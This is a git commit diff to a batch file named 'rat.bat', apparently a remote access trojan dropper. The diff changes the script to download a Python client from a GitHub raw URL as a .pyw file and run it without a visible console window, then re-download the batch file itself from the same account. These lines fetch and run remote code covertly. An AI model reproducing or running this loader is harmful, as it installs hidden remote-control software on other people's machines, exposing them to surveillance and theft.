f45f24c11405bfe23f144e695da8eae5447e3807
imadeit445 <kfoldedhim45@gmail.com>
2024-08-08 02:14:46 -0500

    Update rat.bat

--- rat.bat
+++ rat.bat
@@ -1,5 +1,5 @@
-curl -o Client.py https://raw.githubusercontent.com/oogabooga245/-/main/Client.py
-python3 Client.py
+curl -o Client.pyw https://raw.githubusercontent.com/imadeit445/client/main/Client.pyw
+Client.pyw
 timeout 3 >null.txt
 del null.txt
 curl -o rat.bat https://raw.githubusercontent.com/imadeit445/client/main/rat.bat
